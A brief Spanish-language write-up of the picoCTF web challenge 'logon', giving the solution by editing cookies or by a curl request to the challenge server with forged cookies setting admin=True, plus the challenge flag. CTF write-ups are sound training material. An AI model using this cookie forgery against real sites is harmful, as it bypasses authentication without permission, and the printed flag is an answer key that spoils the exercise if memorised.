### logon
### Descripcion
The factory is hiding things from all of its users.Can you login as Joe and find what they've been looking at? http://fickle-tempest.picoctf.net:59726
### Solucion
Se puede hacer con el cookies editor
picoCTF{th3_c0nsp1r4cy_l1v3s_4d184b0d}
o con el siguiente codigo curl -s http://fickle-tempest.picoctf.net:50359/flag -H "Cookie: password=carlos; username=carlos; admin=True" | grep pico.
### Notas
- En las cookies se guarda la informacion de los log in mientras se esta adentro de la web, pero una vez sales se destruyen.
### Referencias
- https://chromewebstore.google.com/detail/cookie-editor/hlkenndednhfkekhgcdicdfddnkalmdm?pli=1